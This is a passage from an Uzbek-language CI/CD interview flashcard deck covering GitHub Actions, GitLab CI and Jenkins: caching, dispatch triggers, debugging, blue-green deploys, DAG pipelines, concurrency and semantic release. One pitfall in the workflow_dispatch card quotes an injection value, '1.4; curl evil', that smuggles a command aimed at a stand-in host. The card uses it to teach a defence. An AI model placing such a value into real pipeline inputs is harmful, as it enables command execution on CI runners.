va deploy job'lari avtomatik yuklab oladi</pre><p><b>Amalda:</b></p><pre>variables:<br>  npm_config_cache: &quot;$CI_PROJECT_DIR/.npm&quot;<br><br>build:<br>  stage: build<br>  cache:<br>    key:<br>      files: [ package-lock.json ]<br>    paths: [ .npm/ ]<br>    policy: pull-push<br>  script:<br>    - npm ci<br>    - npm run build<br>  artifacts:<br>    paths: [ dist/ ]<br>    expire_in: 1 week<br>    reports:<br>      junit: junit.xml<br><br>test:<br>  stage: test<br>  cache:<br>    key: { files: [ package-lock.json ] }<br>    paths: [ .npm/ ]<br>    policy: pull           # faqat o'qiydi, yuklamaydi (tezroq)<br>  needs: [ build ]<br>  script: [ npm test ]</pre><p><b>Tuzoqlar:</b></p><ul><li>Cache'ni build natijasini uzatish uchun ishlatish — boshqa runner'da cache yo'q, deploy bo'sh papka bilan.</li><li>Bir nechta runner, distributed cache sozlanmagan — cache deyarli hech qachon &quot;hit&quot; bo'lmaydi.</li><li><code>artifacts</code> ga <code>node_modules</code> qo'yish — ulkan yuklash.</li><li><code>expire_in</code> yo'q — disk to'ladi.</li></ul><p><b>Senior nuqta:</b> Cache key'ni lockfile'ga bog'la va o'qiydigan job'larda <code>policy: pull</code> qo'y. Hisobotlar uchun <code>artifacts:reports</code> (junit, coverage) — MR'da natijalar ko'rinadi.</p>	lvl::Middle dom::cicd sec::h12 GHA_GitLab_Jenkins_deep_dive
Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40625	<p>GitHub Actions <code>hashFiles()</code> nima?</p>	<p><b>Qisqa javob:</b> <code>hashFiles()</code> — GitHub Actions ifoda funksiyasi: berilgan glob pattern'ga mos fayllarning birlashtirilgan SHA-256 hash'ini qaytaradi. Asosan cache key yasash uchun: lockfile o'zgarsa hash o'zgaradi, cache key yangilanadi va eski dependency cache'i ishlatilmaydi.</p><p><b>Qanday ishlaydi:</b></p><pre>hashFiles('**/package-lock.json')<br>  -&gt; workspace'dagi barcha mos fayllar (tartiblangan)<br>  -&gt; har biri sha256 -&gt; birlashtirilgan sha256<br>  -&gt; &quot;a3f9c1...&quot;<br>key = npm-Linux-a3f9c1...<br>lockfile o'zgarmadi -&gt; key bir xil -&gt; cache hit<br>lockfile o'zgardi  -&gt; yangi key -&gt; miss -&gt; restore-keys (qisman) -&gt; install -&gt; yangi save<br>fayl topilmasa -&gt; bo'sh string ''</pre><p><b>Amalda:</b></p><pre>- uses: actions/cache@v4<br>  with:<br>    path: |<br>      ~/.cache/go-build<br>      ~/go/pkg/mod<br>    key: go-${{ runner.os }}-${{ hashFiles('**/go.sum') }}<br>    restore-keys: |<br>      go-${{ runner.os }}-</pre><p>Bir nechta pattern:</p><pre>key: deps-${{ hashFiles('**/package-lock.json', '.nvmrc') }}</pre><p>Ko'p <code>setup-*</code> action'larda bu ichida bor: <code>actions/setup-node@v4</code> <code>cache: npm</code> — o'zi lockfile hash'idan foydalanadi.</p><p><b>Tuzoqlar:</b></p><ul><li><code>actions/checkout</code> dan oldin chaqirish — fayllar yo'q, bo'sh hash, hamma run bir xil key.</li><li><code>**/package-lock.json</code> <code>node_modules</code> ichidagi lockfile'larni ham qamrashi mumkin (agar mavjud bo'lsa) — aniqroq path ber.</li><li>Faqat <code>runs-on</code> ichidagi workspace (<code>GITHUB_WORKSPACE</code>) bo'yicha ishlaydi.</li><li>OS'ni key'ga qo'shmaslik — Linux cache'i macOS job'ida tiklanib buziladi.</li></ul><p><b>Senior nuqta:</b> Yaxshi cache key = &quot;nimani cache'layapman, u nimaga bog'liq&quot;: lockfile + OS + til versiyasi. <code>restore-keys</code> qisman tiklashni beradi, lekin eskirgan cache'ni ham tiklaydi — cache hajmi o'sib ketmasligini kuzat.</p>	lvl::Middle dom::cicd sec::h12 GHA_GitLab_Jenkins_deep_dive
Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40626	<p>GitHub Actions <code>workflow_dispatch</code> nima?</p>	<p><b>Qisqa javob:</b> <code>workflow_dispatch</code> — workflow'ni qo'lda ishga tushirish trigger'i: GitHub UI'dagi &quot;Run workflow&quot; tugmasi, <code>gh</code> CLI yoki REST API orqali. Typed input'lar (<code>string</code>, <code>choice</code>, <code>boolean</code>, <code>number</code>, <code>environment</code>) qabul qiladi — masalan qaysi muhitga, qaysi versiyani deploy qilish.</p><p><b>Nega kerak:</b> Har narsa push bilan bo'lmaydi: qo'lda rollback, ma'lumotlar bazasini qayta indekslash, bir martalik skript, hotfix deploy.</p><p><b>Qanday ishlaydi:</b></p><pre>UI: Actions -&gt; workflow -&gt; &quot;Run workflow&quot; -&gt; branch + input'lar<br>CLI: gh workflow run deploy.yml -f env=prod -f version=1.4.2<br>API: POST /repos/{o}/{r}/actions/workflows/deploy.yml/dispatches<br>   -&gt; run (event = workflow_dispatch, inputs.*)</pre><p><b>Amalda:</b></p><pre>name: deploy<br>on:<br>  workflow_dispatch:<br>    inputs:<br>      environment:<br>        type: environment<br>        required: true<br>      version:<br>        type: string<br>        description: Image tag (masalan 1.4.2)<br>        required: true<br>      dry_run:<br>        type: boolean<br>        default: true<br>jobs:<br>  deploy:<br>    runs-on: ubuntu-latest<br>    environment: ${{ inputs.environment }}<br>    steps:<br>      - run: ./deploy.sh &quot;$VERSION&quot; &quot;$DRY_RUN&quot;<br>        env:<br>          VERSION: ${{ inputs.version }}<br>          DRY_RUN: ${{ inputs.dry_run }}</pre><pre>gh workflow run deploy.yml -f environment=staging -f version=1.4.2 -f dry_run=false<br>gh run watch</pre><p><b>Tuzoqlar:</b></p><ul><li>Workflow fayli default branch'da bo'lmasa — UI'da &quot;Run workflow&quot; tugmasi ko'rinmaydi.</li><li>Input'ni to'g'ridan-to'g'ri <code>run:</code> ichiga <code>${{ inputs.version }}</code> qilib qo'yish — script injection (<code>1.4; curl evil</code>). <code>env:</code> orqali ber va validatsiya qil.</li><li>Input'lar soni cheklangan (25 tagacha) va payload hajmi chegaralangan.</li></ul><p><b>Senior nuqta:</b> Qo'lda ishga tushirish ham audit qilinadi (kim, qachon, qaysi input) — environment protection bilan birlashtirib, prod uchun tasdiq talab qil. Rollback runbook'ini <code>workflow_dispatch</code> ga aylantir — insident paytida qo'lda buyruq terish xatosini kamaytiradi.</p>	lvl::Middle dom::cicd sec::h12 GHA_GitLab_Jenkins_deep_dive
Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40627	<p>GitHub Actions <code>repository_dispatch</code> nima?</p>	<p><b>Qisqa javob:</b> <code>repository_dispatch</code> — tashqi tizim GitHub REST API'ga POST so'rov yuborib, ixtiyoriy <code>event_type</code> va JSON <code>client_payload</code> bilan workflow'ni ishga tushiradigan trigger. Repo'lar orasida yoki tashqi servis (CMS, monitoring, boshqa CI) dan hodisa uzatish uchun.</p><p><b>workflow_dispatch'dan farqi:</b> | | workflow_dispatch | repository_dispatch | |---|---|---| | Kim chaqiradi | Odam (UI) yoki API | Asosan tizimlar (API) | | Qaysi workflow | Aniq bitta fayl | <code>event_type</code> ga obuna bo'lgan hammasi | | Parametrlar | Typed input'lar | Erkin JSON <code>client_payload</code> | | Branch | Tanlanadi | Har doim default branch |</p><p><b>Qanday ishlaydi:</b></p><pre>library repo release -&gt; POST /repos/acme/app/dispatches<br>   {&quot;event_type&quot;:&quot;lib-released&quot;,&quot;client_payload&quot;:{&quot;version&quot;:&quot;2.1.0&quot;}}<br>        v<br>app repo: on.repository_dispatch.types: [lib-released] -&gt; workflow<br>   github.event.client_payload.version == &quot;2.1.0&quot;</pre><p><b>Amalda:</b></p><pre>curl -X POST https://api.github.com/repos/acme/app/dispatches \<br>  -H &quot;Authorization: Bearer $GH_TOKEN&quot; \<br>  -H &quot;Accept: application/vnd.github+json&quot; \<br>  -d '{&quot;event_type&quot;:&quot;lib-released&quot;,&quot;client_payload&quot;:{&quot;version&quot;:&quot;2.1.0&quot;}}'<br># javob: 204 No Content</pre><pre>on:<br>  repository_dispatch:<br>    types: [lib-released]<br>jobs:<br>  bump:<br>    runs-on: ubuntu-latest<br>    steps:<br>      - uses: actions/checkout@v4<br>      - run: ./bump-lib.sh &quot;$VERSION&quot;<br>        env:<br>          VERSION: ${{ github.event.client_payload.version }}</pre><p><b>Tuzoqlar:</b></p><ul><li>Workflow default branch'da bo'lishi shart — boshqa branch'da test qilib bo'lmaydi.</li><li>Token huquqi: chaqiruvchi token target repo'ga <code>contents: write</code> (fine-grained PAT) yoki GitHub App kerak — ortiqcha keng PAT ishlatmaslik.</li><li><code>client_payload</code> ishonchsiz ma'lumot — shell'ga to'g'ridan-to'g'ri qo'yma.</li><li>Javob 204 — workflow haqiqatan boshlandimi, run ID qaytmaydi.</li></ul><p><b>Senior nuqta:</b> Repo'lar orasidagi bog'lanish uchun PAT o'rniga GitHub App token (<code>actions/create-github-app-token</code>) ishlat — qisqa muddatli va aniq scope. Ko'p repo bog'liqligida Renovate kabi tool ko'pincha soddaroq.</p>	lvl::Middle dom::cicd sec::h12 GHA_GitLab_Jenkins_deep_dive
Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40628	<p>GitHub Actions workflow'larini qanday debug qilasiz?</p>	<p><b>Qisqa javob:</b> Debug bosqichlari: 1) yiqilgan step log'ini o'qish (<code>gh run view --log-failed</code>); 2) diagnostik log'ni yoqish — <code>ACTIONS_STEP_DEBUG=true</code> va <code>ACTIONS_RUNNER_DEBUG=true</code> (secret yoki variable) yoki &quot;Re-run with debug logging&quot;; 3) kontekstni chop etish; 4) lokal takrorlash (<code>act</code>); 5) oxirgi chora — interaktiv SSH (<code>tmate</code>) runner'ga.</p><p><b>Qanday ishlaydi:</b></p><pre>xato -&gt; log o'qish -&gt; takrorlanadimi?<br>  ha  -&gt; debug logging bilan re-run -&gt; kontekst/env dump<br>      -&gt; lokal act yoki konteynerda takrorlash<br>      -&gt; hali noaniq -&gt; tmate bilan runner ichiga kirish<br>  yo'q (flaky) -&gt; retry statistikasi, vaqt/tarmoq bog'liqligi</pre><p><b>Amalda:</b></p><pre>gh run list --workflow ci.yml --limit 5<br>gh run view 123456789 --log-failed<br>gh run rerun 123456789 --debug          # debug logging bilan qayta</pre><pre>- name: Kontekstni ko'rish<br>  run: |<br>    echo '${{ toJSON(github.event) }}' | jq '.pull_request.head.ref, .action'<br>    env | sort | grep -v -i token<br>- name: Interaktiv debug (faqat qo'lda ishga tushirilganda)<br>  if: ${{ failure() &amp;&amp; github.event_name == 'workflow_dispatch' }}<br>  uses: mxschmitt/action-tmate@v3<br>  with: { limit-access-to-actor: true }</pre><p>Lokal: <code>act pull_request -j test</code> (Docker'da, runner image'ga o'xshash, lekin 100% emas). Workflow sintaksisini tekshirish: <code>actionlint</code>.</p><p><b>Tuzoqlar:</b></p><ul><li><code>toJSON(secrets)</code> yoki <code>env</code> ni to'liq chop etish — secret'lar maskalanadi, lekin hosilalari oqadi.</li><li><code>tmate</code> ni <code>limit-access-to-actor</code> siz — SSH ulanish satri log'da, istalgan kishi kirishi mumkin (public repo!).</li><li>Lokal <code>act</code> muvaffaqiyatli, lekin CI'da yiqiladi — runner image, tarmoq, permissions farqi.</li></ul><p><b>Senior nuqta:</b> Debug vaqtini kamaytirishning eng yaxshi yo'li — mantiqni YAML'dan skriptga chiqarish: skript lokal ishlaydi va test qilinadi, YAML esa faqat chaqiradi. <code>actionlint</code> ni pre-commit'ga qo'sh.</p>	lvl::Middle dom::cicd sec::h12 GHA_GitLab_Jenkins_deep_dive
Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40629	<p>Jenkins'da blue-green deployment qanday tashkil qilinadi?</p>	<p><b>Qisqa javob:</b> Jenkins'da blue-green — pipeline stage'lari: hozir qaysi rang aktivligini aniqlash -&gt; nofaol rangga yangi versiyani deploy qilish -&gt; smoke test -&gt; trafikni almashtirish (load balancer target group, Kubernetes Service selector yoki DNS) -&gt; kuzatish -&gt; muammo bo'lsa qaytarish. Jenkins orkestrator, almashtirishni infra qiladi.</p><p><b>Qanday ishlaydi:</b></p><pre>[Detect active] -&gt; blue aktiv<br>[Deploy idle]   -&gt; green'ga v1.5<br>[Smoke test]    -&gt; green.internal/healthz<br>[Approve?]      -&gt; input (ixtiyoriy)<br>[Switch]        -&gt; LB -&gt; green<br>[Verify]        -&gt; 5 daqiqa error rate<br>   fail -&gt; [Switch back] -&gt; blue</pre><p><b>Amalda (Kubernetes):</b></p><pre>pipeline {<br>  agent { label 'deploy' }<br>  environment { NEW_TAG = &quot;${params.TAG}&quot; }<br>  stages {<br>    stage('Detect') {<br>      steps {<br>        script {<br>          env.ACTIVE = sh(script: &quot;kubectl get svc api -o jsonpath='{.spec.selector.color}'&quot;, returnStdout: true).trim()<br>          env.IDLE = env.ACTIVE == 'blue' ? 'green' : 'blue'<br>        }<br>      }<br>    }<br>    stage('Deploy idle') {<br>      steps {<br>        sh 'kubectl set image deploy/api-$IDLE api=ghcr.io/acme/api:$NEW_TAG'<br>        sh 'kubectl rollout status deploy/api-$IDLE --timeout=5m'<br>      }<br>    }<br>    stage('Smoke') { steps { sh 'curl -fsS http://api-$IDLE.prod.svc/healthz' } }<br>    stage('Switch') {<br>      steps {<br>        input message: &quot;Trafikni ${env.IDLE} ga o'tkazaymi?&quot;<br>        sh '''kubectl patch svc api -p &quot;{\\&quot;spec\\&quot;:{\\&quot;selector\\&quot;:{\\&quot;app\\&quot;:\\&quot;api\\&quot;,\\&quot;color\\&quot;:\\&quot;$IDLE\\&quot;}}}&quot;'''<br>      }<br>    }<br>  }<br>  post {<br>    failure { sh '''kubectl patch svc api -p &quot;{\\&quot;spec\\&quot;:{\\&quot;selector\\&quot;:{\\&quot;app\\&quot;:\\&quot;api\\&quot;,\\&quot;color\\&quot;:\\&quot;$ACTIVE\\&quot;}}}&quot; || true''' }<br>  }<br>}</pre><p>AWS'da: <code>aws elbv2 modify-listener --default-actions Type=forward,TargetGroupArn=$GREEN_TG</code>.</p><p><b>Tuzoqlar:</b></p><ul><li><code>input</code> step agent'ni band qilib turadi — <code>input</code> ni <code>agent none</code> stage'da yoki <code>timeout</code> bilan.</li><li>DB schema eski versiyaga mos emas — rollback ishlamaydi.</li><li>Ikki pipeline bir vaqtda — ikkalasi bir &quot;idle&quot; rangga deploy qiladi; <code>disableConcurrentBuilds()</code> / <code>lock</code>.</li></ul><p><b>Senior nuqta:</b> Bugun Kubernetes'da bu mantiqni Jenkins skriptida emas, Argo Rollouts <code>blueGreen</code> strategiyasida deklarativ qilish ishonchliroq; Jenkins faqat image tag'ini yangilaydi.</p>	lvl::Middle dom::cicd sec::h12 GHA_GitLab_Jenkins_deep_dive
Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40630	<p>GitLab CI DAG pipeline nima?</p>	<p><b>Qisqa javob:</b> GitLab DAG (Directed Acyclic Graph) pipeline — job'larda <code>needs:</code> ishlatiladi: job stage tartibini kutmasdan, faqat o'zi bog'liq bo'lgan job'lar tugashi bilan boshlanadi. Natijada mustaqil zanjirlar parallel ketadi va pipeline umumiy vaqti qisqaradi.</p><p><b>Qanday ishlaydi:</b></p><pre>Stage modeli:<br>  build: [build-api 2m] [build-web 10m]<br>  test:  [test-api] [test-web]        &lt;- test-api ham 10m kutadi!<br>DAG (needs):<br>  build-api 2m -&gt; test-api -&gt; deploy-api<br>  build-web 10m -&gt; test-web -&gt; deploy-web<br>  test-api build-web'ni kutmaydi</pre><p><b>Amalda:</b></p><pre>stages: [build, test, deploy]<br><br>build-api:<br>  stage: build<br>  script: [ make -C api build ]<br>  artifacts: { paths: [ api/bin/ ] }<br><br>build-web:<br>  stage: build<br>  script: [ make -C web build ]<br>  artifacts: { paths: [ web/dist/ ] }<br><br>test-api:<br>  stage: test<br>  needs: [ build-api ]           # faqat shu artifact'lar yuklanadi<br>  script: [ make -C api test ]<br><br>lint:<br>  stage: test<br>  needs: []                      # darhol, pipeline boshida<br>  script: [ make lint ]<br><br>deploy-api:<br>  stage: deploy<br>  needs:<br>    - job: test-api<br>    - job: build-api<br>      artifacts: true<br>  script: [ ./deploy.sh api ]</pre><p>Pipeline sahifasida &quot;Job dependencies&quot; ko'rinishi grafni ko'rsatadi.</p><p><b>Tuzoqlar:</b></p><ul><li><code>needs</code> bor job'lar faqat ko'rsatilgan job'lardan artifact oladi — kerakli artifact job'ini <code>needs</code> ga qo'shishni unutish.</li><li><code>needs</code> dagi job <code>rules</code> tufayli pipeline'da yo'q bo'lsa — xato; <code>optional: true</code> qo'y.</li><li><code>needs</code> soni chegaralangan (default 50 tagacha).</li></ul><p><b>Senior nuqta:</b> Monorepo'da DAG + <code>rules:changes</code> birga juda samarali: o'zgarmagan servis zanjiri umuman ishlamaydi, o'zgarganlari parallel ketadi. Kritik yo'lni (eng uzun zanjir) qisqartirish — pipeline optimizatsiyasining asosiy usuli.</p>	lvl::Middle dom::cicd sec::h12 GHA_GitLab_Jenkins_deep_dive
Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40631	<p>GitHub Actions concurrency group nima?</p>	<p><b>Qisqa javob:</b> Concurrency group — GitHub Actions'da nomlangan guruh: bir guruhda bir vaqtda faqat bitta run (yoki job) ishlaydi. Yangi run kelganda — <code>cancel-in-progress: true</code> bo'lsa eskisi bekor qilinadi, <code>false</code> bo'lsa yangisi navbatda kutadi (pending). Navbatda faqat bitta pending saqlanadi.</p><p><b>Qanday ishlaydi:</b></p><pre>group: deploy-production, cancel-in-progress: false<br>  run#1 ishlayapti<br>  run#2 keldi -&gt; pending<br>  run#3 keldi -&gt; run#2 bekor (pending o'rnini run#3 oladi)<br>  run#1 tugadi -&gt; run#3 boshlanadi<br>(oraliq versiyalar o'tkazib yuboriladi - eng oxirgisi deploy qilinadi)</pre><p><b>Amalda:</b></p><pre># workflow darajasi: PR'dagi eskirgan CI'ni bekor qil<br>concurrency:<br>  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}<br>  cancel-in-progress: true<br><br>jobs:<br>  deploy:<br>    runs-on: ubuntu-latest<br>    environment: production<br>    # job darajasi: deploy'larni ketma-ket qil, uzma<br>    concurrency:<br>      group: deploy-production<br>      cancel-in-progress: false<br>    steps:<br>      - run: ./deploy.sh</pre><p>Run sahifasida: <code>Canceling since a higher priority waiting request for 'ci-refs/heads/feat' exists</code>.</p><p><b>Group nomini tanlash:</b> | Maqsad | Group | |---|---| | Har branch/PR uchun bitta CI | <code>${{ github.workflow }}-${{ github.ref }}</code> | | Butun repo bo'yicha bitta deploy | <code>deploy-prod</code> | | Terraform stack bo'yicha | <code>tf-${{ inputs.stack }}</code> |</p><p><b>Tuzoqlar:</b></p><ul><li><code>github.ref</code> PR'da <code>refs/pull/42/merge</code> — to'g'ri; lekin <code>github.head_ref</code> faqat PR'da bor, push'da bo'sh — guruhlar aralashadi.</li><li>Workflow darajasidagi <code>cancel-in-progress: true</code> deploy job'ini ham uzadi.</li><li>Navbatda faqat bitta pending — &quot;hamma deploy'lar ketma-ket bajarilsin&quot; kerak bo'lsa bu mos emas (GitHub 2025 da <code>queue</code> variantini qo'shishni e'lon qilgan bo'lsa ham, hujjatni tekshir).</li></ul><p><b>Senior nuqta:</b> CI uchun bekor qilish, holat o'zgartiruvchi operatsiyalar uchun navbat — bu qoidani jamoa shablonlariga kirit. Deploy'lar o'rtasida race bo'lmasligi uchun deploy skriptida ham versiya monotonligini tekshir.</p>	lvl::Middle dom::cicd sec::h12 GHA_GitLab_Jenkins_deep_dive
Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40632	<p>GitLab CI'da avtomatik semantic release qanday qilinadi?</p>	<p><b>Qisqa javob:</b> GitLab CI'da semantic release: <code>main</code> ga merge bo'lgach release job'i <code>semantic-release</code> (yoki <code>release-please</code>, <code>cocogitto</code>) ishga tushiradi: Conventional Commits'ni tahlil qilib keyingi versiyani hisoblaydi, Git tag yaratadi, CHANGELOG yozadi, GitLab Release yaratadi va paketni publish qiladi.</p><p><b>Qanday ishlaydi:</b></p><pre>oxirgi tag v1.4.2<br>commit'lar: fix(api): ..., feat(ui): ...<br>   -&gt; eng yuqori: feat -&gt; MINOR -&gt; v1.5.0<br>   -&gt; CHANGELOG.md yangilanadi<br>   -&gt; git tag v1.5.0 + push<br>   -&gt; GitLab Release (release notes)<br>   -&gt; npm/registry publish<br>tag pipeline -&gt; build va deploy v1.5.0</pre><p><b>Amalda:</b></p><pre>// .releaserc.json<br>{<br>  &quot;branches&quot;: [&quot;main&quot;],<br>  &quot;plugins&quot;: [<br>    &quot;@semantic-release/commit-analyzer&quot;,<br>    &quot;@semantic-release/release-notes-generator&quot;,<br>    [&quot;@semantic-release/changelog&quot;, { &quot;changelogFile&quot;: &quot;CHANGELOG.md&quot; }],<br>    &quot;@semantic-release/npm&quot;,<br>    &quot;@semantic-release/gitlab&quot;,<br>    [&quot;@semantic-release/git&quot;, { &quot;assets&quot;: [&quot;CHANGELOG.md&quot;, &quot;package.json&quot;] }]<br>  ]<br>}</pre><pre>release:<br>  stage: release<br>  image: node:22<br>  rules:<br>    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH<br>  variables:<br>    GIT_DEPTH: 0             # to'liq tarix va tag'lar kerak<br>  script:<br>    - npm ci<br>    - npx semantic-release</pre><p><code>GITLAB_TOKEN</code> (project access token, <code>api</code> + <code>write_repository</code>) CI variable sifatida, Protected + Masked.</p><p><b>Tuzoqlar:</b></p><ul><li>Shallow clone (<code>GIT_DEPTH</code> default 20/50) — oldingi tag topilmaydi, versiya noto'g'ri.</li><li>Release job yaratgan commit (<code>chore(release)</code>) yana pipeline qo'zg'atadi — <code>[skip ci]</code> yoki <code>rules</code> bilan cheklash.</li><li>Squash merge'da MR sarlavhasi conventional bo'lmasa — reliz chiqmaydi.</li><li>Token protected bo'lmasa — har branch'dagi job tag yarata oladi.</li></ul><p><b>Senior nuqta:</b> Release'ni bitta joydan (faqat <code>main</code>, protected runner) qil va tag pipeline'da artifact'ni build qil — versiya va artifact bog'liq bo'ladi. Monorepo uchun release-please yoki changesets har paketni alohida boshqaradi.</p>	lvl::Middle dom::cicd sec::h12 GHA_GitLab_Jenkins_deep_dive
Interview Drill::CI/CD::H12 GHA, GitLab & Jenkins deep dive	idrill-40633	<p>Jenkins pipeline <code>post</code> bo'limi nima?</p>	<p><b>Qisqa javob:</b> <code>post</code> — Declarative Pipeline'da pipeline yoki stage tugaganda natijaga qarab bajariladigan bloklar: <code>always</code>, <code>success</code>, <code>failure</code>, <code>unstable</code>, <code>aborted</code>, <code>changed</code>, <code>fixed</code>, <code>regression</code>, <code>unsuccessful</code>, <code>cleanup</code>.
